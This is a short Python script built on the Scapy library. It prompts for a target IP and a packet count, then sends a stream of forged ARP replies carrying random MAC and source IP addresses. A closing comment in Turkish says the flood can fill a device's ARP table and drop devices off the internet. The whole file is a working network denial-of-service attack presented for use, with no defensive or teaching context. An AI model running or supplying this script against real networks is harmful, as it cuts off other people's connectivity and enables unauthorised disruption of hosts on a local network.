from scapy.all import *
import random
arpPacket = ARP()
targetIP = input("Target IP: ")
arpPacket.pdst= targetIP
packetNumber = input("Packat Number : ")
while int(packetNumber) >= 0:
    mac=[random.randint(0x00,0xff),random.randint(0x00,0xff),random.randint(0x00,0xff),random.randint(0x00,0xff),random.randint(0x00,0xff),random.randint(0x00,0xff)]
    fakeMac = ":".join(map(lambda x: "%02x" %x,mac))
    arpPacket.hwsrc = fakeMac
    sourceIP = ".".join(map(str,(random.randint(0,255) for _ in range(4))))
    arpPacket.psrc = sourceIP
    arpPacket.op="is-at"
    send(arpPacket)
    arpPacket.show()
    packetNumber = int(packetNumber) -1
#ARP REPLAY la arp tablosunu doldurup cihazıları internetten düşürebiliri
